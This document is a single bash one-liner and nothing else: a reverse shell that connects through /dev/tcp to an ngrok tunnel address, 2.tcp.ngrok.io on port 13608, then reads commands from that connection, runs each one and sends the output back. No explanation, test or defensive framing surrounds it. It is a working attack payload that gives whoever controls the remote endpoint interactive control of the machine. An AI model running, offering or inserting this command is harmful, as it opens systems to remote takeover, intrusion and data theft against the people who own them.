exec 5<>/dev/tcp/2.tcp.ngrok.io/13608;cat <&5 | while read line; do $line 2>&5 >&5; done
